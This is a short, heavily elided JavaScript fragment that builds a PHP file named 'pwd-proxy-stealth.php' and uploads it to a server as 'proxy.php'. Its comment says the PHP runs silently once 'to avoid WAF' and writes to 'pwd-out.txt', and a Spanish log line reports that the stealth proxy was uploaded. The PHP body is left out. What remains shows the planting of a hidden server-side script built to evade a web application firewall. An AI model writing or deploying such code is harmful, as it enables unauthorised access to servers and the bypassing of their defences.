...
async function verifyPwdProxyStealth() {
    ...
    try {
        ...
        const proxyPhp = `<?php
    // Run exactly once silently to avoid WAF
    if (!file_exists('pwd-out.txt')) {
...
?>`;
        ...
        fs.writeFileSync("pwd-proxy-stealth.php", proxyPhp);
        await client.uploadFrom("pwd-proxy-stealth.php", "proxy.php");
        console.log("✅ subido stealth proxy");
